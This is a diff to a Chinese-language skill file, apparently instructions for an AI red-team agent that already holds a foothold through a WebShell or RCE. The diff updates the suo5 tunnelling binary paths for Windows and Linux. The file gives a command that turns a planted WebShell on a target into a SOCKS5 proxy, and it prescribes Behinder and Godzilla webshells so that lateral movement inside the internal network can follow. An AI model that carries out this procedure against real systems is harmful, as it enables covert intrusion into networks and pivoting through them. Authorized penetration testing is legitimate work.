@@ -11,11 +11,17 @@ whenToUse: 已拿到一台机器（WebShell/RCE）需要进入内网扫描与横
 > 然后才谈内网测绘与横向。**没有隧道就不要手搓内网探测脚本**——手搓既慢又容易把入口打死。
 > 隧道入口的 WebShell 必须是冰蝎马/哥斯拉马（见技能 `webshell-toolkit`），否则用户无法复用。
 
-二进制：`$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）
+二进制（**平台要分清，选错跑不起来**）：
+- **本机（Windows 控制端）**：`$DSH_HOME/redteam/toolkit/suo5/suo5.exe` ← 建隧道用的是这个
+- 跳板机（Linux）：`suo5-linux-amd64`（静态 Go，无依赖）—— **本机没有**，需自己放到跳板机
 
 ## 建立隧道
 ```bash
-SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64
+# Windows 控制端（本机只有 suo5.exe）
+SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5.exe
+
+# 若在 Linux 跳板机上执行，改成（该文件需自行上传到跳板机）
+# SUO5=./suo5-linux-amd64
 
 # 1) 用 WebShell 作为隧道端点（HTTP 型）
 $SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5
